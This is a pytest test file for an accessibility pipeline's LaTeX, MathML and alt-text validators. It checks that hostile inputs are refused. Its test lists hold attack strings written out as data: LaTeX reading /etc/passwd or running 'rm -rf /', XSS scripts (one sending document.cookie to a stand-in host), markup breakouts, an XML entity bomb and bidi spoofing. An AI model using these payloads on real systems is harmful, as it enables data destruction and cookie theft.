"""Validators: LaTeX allowlist, safe conversion, MathML allowlist, alt-text rules.

Every failure is asserted by category code, because codes (never content) are what gets
logged and aggregated.
"""

from __future__ import annotations

import json
from pathlib import Path

import defusedxml.ElementTree as DET
import pytest
from latex2mathml.converter import convert

from readablestem.eval.gold_scoring import iter_gold_records
from readablestem.pipeline import validate
from readablestem.pipeline.validate import (
    LatexConversionError,
    check_alt,
    check_latex,
    check_mathml,
    clean_alt,
    has_errors,
    safe_latex_to_mathml,
)

REPO = Path(__file__).resolve().parents[1]
GOLD = {r["id"]: r for r in iter_gold_records(REPO / "data" / "gold", kind="equation")}
SAMPLE_LATEX = [
    json.loads(line)
    for line in (Path(__file__).parent / "fixtures" / "sample_latex_predictions.jsonl")
    .read_text(encoding="utf-8")
    .splitlines()
]
NS = 'xmlns="http://www.w3.org/1998/Math/MathML"'


def failed_codes(checks) -> set[str]:
    return {c.code for c in checks if not c.passed}


# ---------------------------------------------------------------------- check_latex


@pytest.mark.parametrize("row", SAMPLE_LATEX, ids=lambda r: r["id"].rsplit("/", 2)[-2][:3])
def test_known_good_latex_passes_every_check(row):
    checks = check_latex(row["latex"])
    assert all(c.passed for c in checks), failed_codes(checks)


@pytest.mark.parametrize("latex", [r"\frac{a}{b", "x}", "}{", r"\sqrt{x"])
def test_unbalanced_braces(latex):
    assert "unbalanced_braces" in failed_codes(check_latex(latex))


@pytest.mark.parametrize(
    "latex",
    [
        r"\begin{array}{c} x",
        r"x \end{array}",
        r"\begin{pmatrix} x \end{bmatrix}",
        r"\begin x \end{array}",
    ],
)
def test_unbalanced_environments(latex):
    assert "unbalanced_env" in failed_codes(check_latex(latex))


@pytest.mark.parametrize(
    "latex",
    [
        r"\input{/etc/passwd}",
        r"\include{chapter}",
        r"\write18{rm -rf /}",
        r"\immediate\openout1=x",
        r"\def\x{y} \x",
        r"\gdef\x{y}",
        r"\newcommand{\x}{y}",
        r"\renewcommand{\x}{y}",
        r"\let\a\b",
        r"\catcode`\@=11",
        r"\csname x\endcsname",
        r"\href{https://example.org}{x}",
        r"\url{https://example.org}",
        r"\usepackage{amsmath}",
        r"\documentclass{article}",
        r"\special{ps: x}",
        r"\style{color:red}{x}",
        r"\class{evil}{x}",
    ],
)
def test_forbidden_commands(latex):
    codes = failed_codes(check_latex(latex))
    assert "forbidden_command" in codes


# Structural commands that only make sense with a partner or inside an environment.
_STRUCTURAL = {
    "left", "right", "middle", "begin", "end", "limits", "nolimits", "hspace", "hline",
    "nonumber", "notag", "displaystyle", "textstyle", "pmod", "mod",
    "big", "Big", "bigg", "Bigg", "bigl", "bigr", "Bigl", "Bigr", "biggl", "biggr",
    "Biggl", "Biggr",
    "arg",  # rewritten to \operatorname{arg} before conversion (`safe_latex_to_mathml`)
}  # fmt: skip


def test_every_allowed_command_converts_without_leftovers():
    """The allowlist must not admit a command latex2mathml would copy through as text."""
    leftovers = []
    for cmd in sorted(validate.SYMBOL_COMMANDS - _STRUCTURAL):
        if "\\" in convert(f"\\{cmd} x"):
            leftovers.append(cmd)
    for cmd in sorted(validate.ONE_ARG_COMMANDS):
        if "\\" in convert(f"\\{cmd}{{x}}"):
            leftovers.append(cmd)
    for cmd in sorted(validate.TWO_ARG_COMMANDS):
        if "\\" in convert(f"\\{cmd}{{x}}{{y}}"):
            leftovers.append(cmd)
    assert leftovers == []


# Found on real LaTeX PDFs (arXiv papers, docs/eval-realworld.md): proposals the allowlist refused.
_REAL_WORLD_COMMANDS = {
    "arg": r"\arg\min_{x} f(x)",
    "substack": r"\sum_{\substack{i<j \\ k>0}} x_{ij}",
    "succsim": r"a \succsim b",
    "colon": r"f \colon A \to B",
    "coloneqq": r"a \coloneqq b",
    "triangleq": r"a \triangleq b",
    "trianglelefteq": r"S \trianglelefteq T",
    "gtrapprox": r"N \gtrapprox 30",
    "intercal": r"a \intercal b",
    "rightsquigarrow": r"u \rightsquigarrow v",
    "leadsto": r"u \leadsto v",
}


@pytest.mark.parametrize("command", sorted(_REAL_WORLD_COMMANDS))
def test_commands_seen_on_real_pdfs_pass_the_checks_and_convert_cleanly(command):
    latex = _REAL_WORLD_COMMANDS[command]
    assert command in validate.ALLOWED_COMMANDS
    assert not has_errors(validate.check_latex(latex))
    mathml = validate.safe_latex_to_mathml(latex, "inline")
    assert "\\" not in mathml


def test_escaped_percent_keeps_everything_after_it():
    assert "<mo>+</mo><mi>y</mi>" in safe_latex_to_mathml(r"x = 50\% + y")
    assert "<mi>y</mi>" not in safe_latex_to_mathml("x = 50% + y")  # what check_latex stops


@pytest.mark.parametrize(
    "latex",
    [
        r"x \hspace y",  # latex2mathml: <mspace width="y">, the y is gone
        r"\hspace{abc} x",
        r"\hspace{-50em} x",
        r"\hspace1em x",
        r"\hspace{.5em} x",
        r"\hspace\alpha x",
        r"x \hspace",
    ],
)
def test_hspace_needs_a_braced_dimension(latex):
    checks = check_latex(latex)
    assert "bad_argument" in failed_codes(checks) and has_errors(checks)


BREAKOUTS = [
    'x = \\text{</mtext><mn\tintent="seven">5</mn><mtext>}',
    'x = \\text{</mtext><mn\talttext="seven">5</mn><mtext>}',
    'v = \\text{</mtext><mspace\twidth="-40em"/><mtext>}9',
    r"x = 5\text{</mtext><mphantom><mo>+</mo><mn>1</mn></mphantom><mtext>}",
    r"F = m a \text{<math>x</math>}",
    r"x \text{<mi>y</mi>}",
    '\\text{<img\tsrc="x"\tonerror="alert(1)"/>}',
    r"\text{R&D}",
    r"\text{a > b}",
    r"\text<b> + y",
]


@pytest.mark.parametrize("command", sorted(validate.TEXT_MODE_COMMANDS))
def test_markup_in_any_text_command_is_refused(command):
    checks = check_latex(rf"\{command}{{<script>alert(1)</script>}}")
    assert "markup_in_text" in failed_codes(checks) and has_errors(checks)


@pytest.mark.parametrize("latex", BREAKOUTS)
def test_markup_in_text_breakouts_are_refused(latex):
    assert "markup_in_text" in failed_codes(check_latex(latex))


# ------------------------------------------------------------- safe_latex_to_mathml


@pytest.mark.parametrize("latex", [r"\left( x", r"\begin{array}{c} x", "x^"])
def test_conversion_errors_are_content_free(latex):
    with pytest.raises(LatexConversionError) as exc:
        safe_latex_to_mathml(latex)
    assert latex not in str(exc.value)
    assert exc.value.__cause__ is None  # the converter's message (with the input) is dropped


@pytest.mark.parametrize(
    ("latex", "spec"),
    [
        (r"\begin{aligned} a &= b \\ &= c \end{aligned}", "rl"),
        (r"\begin{aligned}[t] a &= b \end{aligned}", "rl"),
        (r"\begin{align} a &= b & c &= d \\ e &= f \end{align}", "rlrl"),
        (r"\begin{align*} a &= b \end{align*}", "rl"),
        (r"\begin{split} a &= b \\ &= c \end{split}", "rl"),
        (r"\begin{gathered} a = b \\ c = d \end{gathered}", "c"),
        # Ampersands inside a nested matrix belong to the matrix, not the alignment.
        (r"\begin{aligned} M &= \begin{pmatrix} a & b \\ c & d \end{pmatrix} \end{aligned}", "rl"),
    ],
)
def test_alignment_environments_rewritten_to_array(latex, spec):
    rewritten = validate.rewrite_alignment_environments(latex)
    assert rewritten.startswith(rf"\begin{{array}}{{{spec}}}")
    assert rewritten.endswith(r"\end{array}")
    assert all(c.passed for c in check_mathml(safe_latex_to_mathml(latex)))


@pytest.mark.parametrize(
    "latex", ["{" * 999 + "x" + "}" * 999, "x" * 2001], ids=["deep-braces", "too-long"]
)
def test_pathological_input_fails_cleanly(latex):
    """Deep nesting or oversize input is a LatexConversionError, never a RecursionError."""
    with pytest.raises(LatexConversionError):
        safe_latex_to_mathml(latex)


@pytest.mark.parametrize("row", SAMPLE_LATEX, ids=lambda r: r["id"].rsplit("/", 2)[-2][:3])
def test_sample_latex_converts_to_valid_mathml(row):
    assert all(c.passed for c in check_mathml(safe_latex_to_mathml(row["latex"])))


@pytest.mark.parametrize(
    ("latex", "text"),
    [
        (r"\text{25\% efficient}", "25%\xa0efficient"),
        (r"\text{x\_1}", "x_1"),
        (r"\text{\#1}", "#1"),
        (r"\text{\$5}", "$5"),
        (r"\textbf{100\%}", "100%"),
    ],
)
def test_escaped_specials_in_text_are_unescaped(latex, text):
    """latex2mathml copies text arguments verbatim, backslash included."""
    mathml = safe_latex_to_mathml(latex)
    assert f">{text}</mtext>" in mathml and "\\" not in mathml
    assert all(c.passed for c in check_mathml(mathml))


def _assert_allowlisted(mathml: str) -> None:
    root = DET.fromstring(mathml)
    assert root.tag == "{http://www.w3.org/1998/Math/MathML}math"
    for element in root.iter():
        name = element.tag.rsplit("}", 1)[-1]
        assert name in validate.ALLOWED_ELEMENTS, name
        assert name != "math" or element is root
        for attribute in element.attrib:
            assert attribute in validate.ALLOWED_ATTRIBUTES, attribute
        if name in {"mi", "mn", "mo", "mtext", "ms"}:
            assert len(element) == 0
    allowlist = {"mathml.root", "mathml.known_elements", "mathml.safe_attributes"}
    allowlist.add("mathml.token_content")
    assert all(c.passed for c in check_mathml(mathml) if c.name in allowlist)


INJECTIONS = [
    *BREAKOUTS,
    r"\text{<script>alert(document.cookie)</script>}",
    r"\textbf{<script>fetch('//x.y/'+document.cookie)</script>}",
    r"\mbox{<iframe></iframe>}",
    "\\mbox{<img\nsrc=x\nonerror=alert(1)>}",
    r"\text{<annotation-xml encoding='text/html'><mi>x</mi></annotation-xml>}",
    r"\verb|</mtext><mphantom><mn>1</mn></mphantom><mtext>|",
    r"\href{javascript:alert(1)}{x}",
    r"\style{color:red}{x}",
    r"\class{evil}{x}",
    r"\color{red}{x}",
    r"\text{&lt;script&gt;}",
]


@pytest.mark.parametrize("latex", INJECTIONS)
def test_safe_latex_to_mathml_output_is_always_allowlisted(latex):
    """Even without check_latex: markup in text stays text, and anything the converter
    turns into a disallowed element or attribute is refused."""
    try:
        mathml = safe_latex_to_mathml(latex)
    except LatexConversionError as exc:
        assert latex not in str(exc)
        return
    _assert_allowlisted(mathml)
    assert "<script" not in mathml and "<img" not in mathml and "<iframe" not in mathml


# ----------------------------------------------------------------------- check_mathml


@pytest.mark.parametrize(
    ("mathml", "code"),
    [
        ("<math", "not_well_formed"),
        (f"<math {NS}><mi>&nbsp;</mi></math>", "not_well_formed"),
        (
            f'<!DOCTYPE math [<!ENTITY x "boom">]><math {NS}><mi>&x;</mi></math>',
            "forbidden_xml",
        ),
        (
            '<!DOCTYPE math SYSTEM "http://example.org/x.dtd"><math><mi>x</mi></math>',
            "forbidden_xml",
        ),
        (f"<mrow {NS}><mi>x</mi></mrow>", "wrong_root"),
        ("<math><mi>x</mi></math>", "missing_namespace"),
        (f"<math {NS}><script>alert(1)</script></math>", "unknown_element"),
        (f'<math {NS}><mglyph src="https://example.org/x.png"/></math>', "unknown_element"),
        (
            f'<math {NS}><h:a xmlns:h="http://www.w3.org/1999/xhtml">x</h:a></math>',
            "unknown_element",
        ),
        (
            f'<math {NS}><mrow href="https://example.org"><mi>x</mi></mrow></math>',
            "unsafe_attribute",
        ),
        (f'<math {NS}><mi onclick="alert(1)">x</mi></math>', "unsafe_attribute"),
        (f'<math {NS}><mi style="color:red">x</mi></math>', "unsafe_attribute"),
        (f'<math {NS}><mi class="evil">x</mi></math>', "unsafe_attribute"),
        (
            f'<math {NS} xmlns:xl="http://www.w3.org/1999/xlink"><mi xl:href="x">x</mi></math>',
            "unsafe_attribute",
        ),
        (f'<math {NS}><mi mathvariant="javascript:alert(1)">x</mi></math>', "unsafe_attribute"),
        (f'<math {NS}><mstyle mathcolor="white"><mi>x</mi></mstyle></math>', "unknown_attribute"),
        (f'<math {NS}><mi data-x="1">x</mi></math>', "unknown_attribute"),
        (f"<math {NS}><mfrac><mi>a</mi></mfrac></math>", "bad_arity"),
        (f"<math {NS}><msubsup><mi>a</mi><mi>b</mi></msubsup></math>", "bad_arity"),
        (f"<math {NS}><mi>\\foo</mi></math>", "unconverted_command"),
        (f"<math {NS}><mtext>\\textbf{{x</mtext></math>", "unconverted_command"),
        (f"<math {NS}><merror><mtext>x</mtext></merror></math>", "unconverted_command"),
        (f"<math {NS}><mi>&amp;</mi><mo>=</mo></math>", "unconverted_command"),
        # Escaped specials and spacing copied through in text mode read as "backslash".
        (f"<math {NS}><mtext>25\\% efficient</mtext></math>", "unconverted_command"),
        (f"<math {NS}><mtext>x\\_1</mtext></math>", "unconverted_command"),
        (f"<math {NS}><mtext>\\#1</mtext></math>", "unconverted_command"),
        (f"<math {NS}><mtext>a\\,b</mtext></math>", "unconverted_command"),
        (f"<math {NS}><mtext>a\\\\b</mtext></math>", "unconverted_command"),
        (f"<math {NS}><mtext>a\\\xa0b</mtext></math>", "unconverted_command"),
        # Markup smuggled into tokens, nested math, speech overrides.
        (f"<math {NS}><mtext><script>alert(1)</script></mtext></math>", "unknown_element"),
        (f"<math {NS}><mtext><script>alert(1)</script></mtext></math>", "markup_in_token"),
        (f"<math {NS}><mtext><mi>y</mi></mtext></math>", "markup_in_token"),
        (f"<math {NS}><mrow><math><mi>x</mi></math></mrow></math>", "nested_math"),
        (f'<math {NS}><mn intent="seven">5</mn></math>', "unsafe_attribute"),
        (f'<math {NS}><mrow arg="a"><mi>x</mi></mrow></math>', "unknown_attribute"),
        (f'<math {NS}><mi alttext="seven">x</mi></math>', "unknown_attribute"),
    ],
)
def test_mathml_failures(mathml, code):
    checks = check_mathml(mathml)
    assert code in failed_codes(checks)
    assert has_errors(checks)


def _tree(markup: str):
    return DET.fromstring(markup)


@pytest.mark.parametrize(
    ("markup", "code"),
    [
        (f"<math {NS}><mtext><script>alert(1)</script></mtext></math>", "unknown_element"),
        (f'<math {NS}><mn intent="seven">5</mn></math>', "unsafe_attribute"),
        (f'<math {NS}><mi onclick="x">5</mi></math>', "unsafe_attribute"),
        (f"<math {NS}><mrow><math><mi>x</mi></math></mrow></math>", "nested_math"),
        (f"<math {NS}><mtext><mi>y</mi></mtext></math>", "markup_in_token"),
        (f"<mrow {NS}><mi>x</mi></mrow>", "wrong_root"),
        (f"<math {NS}>" + "<mrow>" * 250 + "</mrow>" * 250 + "</math>", "too_deep"),
    ],
)
def test_serialize_mathml_refuses_unsafe_trees(markup, code):
    """The public serialiser is the last step before MathML reaches HTML."""
    with pytest.raises(validate.UnsafeMathMLError) as exc:
        validate.serialize_mathml(_tree(markup))
    assert str(exc.value) == code


def test_billion_laughs_is_refused_quickly():
    bomb = (
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">'
        '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]>'
        f"<math {NS}><mi>&lol2;</mi></math>"
    )
    assert failed_codes(check_mathml(bomb)) == {"forbidden_xml"}


def test_too_deep_and_too_large():
    deep = f"<math {NS}>" + "<mrow>" * 80 + "<mi>x</mi>" + "</mrow>" * 80 + "</math>"
    assert "too_deep" in failed_codes(check_mathml(deep))
    huge = f"<math {NS}>" + "<mi>x</mi>" * 20_000 + "</math>"
    assert failed_codes(check_mathml(huge)) == {"too_large"}
    many = f"<math {NS}>" + "<mi/>" * 6_000 + "</math>"
    assert "too_large" in failed_codes(check_mathml(many))


# -------------------------------------------------------------------------- check_alt


GOOD_ALT = "Line graph of position versus time: position rises steadily, then levels off at 5 km."


def test_good_alt_passes_everything():
    checks = check_alt(GOOD_ALT, decorative=False, caption="Figure 2.3 The drive to school.")
    assert all(c.passed for c in checks)
    assert {c.name for c in checks} >= {"alt.length", "alt.not_filename", "alt.not_caption_copy"}


def test_empty_alt_on_informative_figure():
    checks = check_alt("  ", decorative=False)
    assert failed_codes(checks) == {"empty"} and has_errors(checks)


@pytest.mark.parametrize(
    "alt",
    [
        "See https://example.org/chart",
        "Chart at www.example.org",
        '<img src="x.png">',
        "A graph&nbsp;of speed",
        "[speed graph](http://x)",
        r"The curve \frac{1}{x}",
    ],
)
def test_url_or_markup(alt):
    checks = check_alt(alt, decorative=False)
    assert "url_or_markup" in failed_codes(checks) and has_errors(checks)


@pytest.mark.parametrize("alt", ["Image", "figure", "Alt text", "graph", "Figure 2.3", "chart."])
def test_placeholders(alt):
    checks = check_alt(alt, decorative=False)
    assert "placeholder" in failed_codes(checks) and has_errors(checks)


def test_invisible_characters_cannot_hide_a_file_name_or_url():
    assert "filename" in failed_codes(check_alt("IMG_20​41.jpg", decorative=False))
    assert "url_or_markup" in failed_codes(check_alt("h​ttps://x.org", decorative=False))


def test_bidi_controls_are_an_error_and_cleaning_removes_them():
    """check_alt judged the visible text but the stored alt kept U+202E and friends, so a
    reviewer saw reordered text while a screen reader spoke the logical order."""
    tricky = "A graph of speed \u202eemit tsniaga\u202c over time"
    assert "bidi_control" in failed_codes(check_alt(tricky, decorative=False))
    assert has_errors(check_alt(tricky, decorative=False))
    cleaned = clean_alt(tricky)
    assert "\u202e" not in cleaned and "\u202c" not in cleaned
    assert all(c.passed for c in check_alt(cleaned, decorative=False))
    assert clean_alt("A  bar\u200b chart\u2067 ") == "A bar chart"


@pytest.mark.parametrize(
    "alt",
    [
        "Logo of the physics department.",
        "Empty beaker on a balance reading 0 g.",
        "Unknown resistor R in series with a 5 V battery.",
        "Bar chart: trip C is fastest at 150 km/h.",
        "Graph of y = x squared.",
    ],
)
def test_real_descriptions_with_placeholder_words_pass(alt):
    checks = check_alt(alt, decorative=False)
    assert all(c.passed for c in checks), failed_codes(checks)
